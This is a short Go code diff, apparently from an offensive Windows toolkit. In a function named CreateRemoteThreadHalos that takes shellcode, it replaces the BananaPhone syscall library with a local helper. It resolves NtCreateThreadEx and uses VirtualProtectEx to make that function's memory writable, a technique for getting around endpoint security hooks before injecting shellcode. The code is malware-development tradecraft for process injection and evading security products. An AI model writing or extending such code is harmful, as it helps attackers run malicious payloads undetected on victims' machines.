@@ -6,8 +6,6 @@ import (
   "errors"
   "syscall"
 
-  bap "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
-
   // Internal
   "golang.org/x/sys/windows"
 )
@@ -80,15 +78,10 @@ func CreateRemoteThreadHalos(shellcode []byte) (error) {
   kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
   VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")
 
-  bp, e := bap.NewBananaPhone(bap.AutoBananaPhoneMode)
+  mess, e := GetFuncPtr("NtCreateThreadEx")
   if e != nil {
     return e
   }
-
-  mess, e := bp.GetFuncPtr("NtCreateThreadEx")
-  if e != nil {
-		return e
-	}
 	
 	oldProtect := windows.PAGE_EXECUTE_READ
 	VirtualProtectEx.Call(uintptr(0xffffffffffffffff), uintptr(mess), uintptr(0x100), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
